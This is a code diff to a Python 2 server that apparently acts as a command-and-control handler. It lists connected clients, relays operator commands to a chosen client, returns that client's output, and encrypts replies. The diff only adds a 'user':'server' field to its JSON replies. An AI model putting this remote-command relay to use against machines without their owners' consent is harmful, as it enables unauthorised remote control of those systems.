@@ -67,7 +67,7 @@ def getConnections():
     if len(allAddresses) == 1: client = "Client"
     else: client = "Clients"
         
-    body = {"version":"{versionNumber}","status":"OK", "command":"accept", "reply": "{clientNumber} {cli} Added".format(versionNumber = config["_API_VERSION"], clientNumber=str(len(allAddresses)), cli=client), "error": "null"}
+    body = {"version":"{versionNumber}", "user":"server", "status":"OK", "command":"accept", "reply": "{clientNumber} {cli} Added".format(versionNumber = config["_API_VERSION"], clientNumber=str(len(allAddresses)), cli=client), "error": "null"}
     reply = Encode().process(body)
     return reply
 
@@ -106,8 +106,8 @@ def listClients():
 				d['ip']=str(item[0])
 				clientList.append(d)
 			jsonList = Encode().process(clientList)
-			reply = {"version":config["_API_VERSION"],"status":"OK", "command":"list", "total": str(length), "clients": clientList, "error": "null"}
-		else: reply = {"version":config["_API_VERSION"],"status":"OK", "command":"list", "total": str(length), "clients": "null", "error": "null"}
+			reply = {"version":config["_API_VERSION"], "user":"server", "status":"OK", "command":"list", "total": str(length), "clients": clientList, "error": "null"}
+		else: reply = {"version":config["_API_VERSION"], "user":"server", "status":"OK", "command":"list", "total": str(length), "clients": "null", "error": "null"}
 		reply = Encode().process(reply)
 		return reply
     except Exception as e: print " [!] {error}".format(error = e)
@@ -135,13 +135,13 @@ def interact(id, timeout, q):
 					
 				try:
 					if (command == "stop"): 
-						closed = {"version":config["_API_VERSION"],"status":"OK", "command":"interact", "reply": "Connection Closed", "error": "null"}
+						closed = {"version":config["_API_VERSION"], "user":"server", "status":"OK", "command":"interact", "reply": "Connection Closed", "error": "null"}
 						sendController(closed, q)
 						break
 					else:
 						allConnections[id].send(command)
 						msg=allConnections[id].recv(20480)
-						body = {"version":config["_API_VERSION"],"status":"OK", "command":"interact", "reply": msg, "error": "null"}
+						body = {"version":config["_API_VERSION"], "user":"server", "status":"OK", "command":"interact", "reply": msg, "error": "null"}
 						reply = Encode().process(body)
 						if (sendController(reply, q) == 0):
 							breakit = True
@@ -198,19 +198,19 @@ def main():
 				client = Api().ProcessClient(Message)
 				print " [+] Client ID: {clientid}".format(clientid=client)
 				if ((int(client) <= len(allAddresses)) and (int(client) >= 0 )):
-					body = {"version":config["_API_VERSION"], "status":"OK", "command":"interact", "reply": "Connecting To Client", "error": "null"}
+					body = {"version":config["_API_VERSION"],  "user":"server", "status":"OK", "command":"interact", "reply": "Connecting To Client", "error": "null"}
 					reply = Encode().process(body)
 					reply = encryption().encrypt(reply, config["password"])
 					sendController(reply, q)
 					inter = interact(int(client), timeout, q)
 				else:
-					body = {"version":config["_API_VERSION"], "status":"ERROR", "command":"interact", "reply": " ", "error": "ID Out Of Range"}
+					body = {"version":config["_API_VERSION"],  "user":"server", "status":"ERROR", "command":"interact", "reply": " ", "error": "ID Out Of Range"}
 					reply = Encode().process(body)
 					reply = encryption().encrypt(reply, config["password"])
 					sendController(reply, q)
 					
 			elif(command == "invalid"):
-				body = {"version":config["_API_VERSION"], "status":"ERROR", "command":"unknown",
+				body = {"version":config["_API_VERSION"],  "user":"server", "status":"ERROR", "command":"unknown",
 					"reply": "I'm Affraid I Can't Let You Do That Dave",
 					 "error": "Invalid Command Supplied"}
 				reply = Encode().process(body)
@@ -224,7 +224,7 @@ def main():
 				q.close()
 				break
 			else:
-				body = {"version":config["_API_VERSION"], "status":"ERROR", "command":"unknown",
+				body = {"version":config["_API_VERSION"], "user":"server", "status":"ERROR", "command":"unknown",
 					"reply": "I'm Affraid I Can't Let You Do That Dave",
 					 "error": "An Unknown Error Has Occured"}
 				reply = Encode().process(body)
